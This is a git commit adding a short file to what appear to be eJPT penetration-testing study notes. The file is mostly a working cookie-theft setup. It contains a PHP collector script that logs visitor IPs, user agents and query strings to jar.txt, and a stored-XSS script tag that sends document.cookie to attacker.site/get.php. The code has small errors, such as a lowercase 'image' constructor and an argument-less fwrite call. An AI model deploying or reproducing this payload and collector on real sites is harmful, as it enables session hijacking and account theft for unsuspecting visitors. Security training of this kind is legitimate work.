0715e6da76914c1a8d8102d1aefb51406f0d1cbe
Ari Rod <8119128+Ari-Roda@users.noreply.github.com>
2020-11-17 08:41:41 +0900

    Update and rename xss.md to xss.php

---
+++ ejpt/xss.php
@@ -0,0 +1,20 @@
+
+//get.php file on web server to write received data to jar.txt
+
+<?php
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+$fp = fopen('jar.txt', 'a');
+
+fwrite($fp, $ip.' '.$browser." \n");
+fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
+fwrite($fp);
+?>
+
+
+
+//php string to send cookies to above php file. using stored xss when a user visits site with this xss on it will send there cookie to above php code file. could //also stand up a simple webserver and send it there.
+
+<script> var i = new image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>
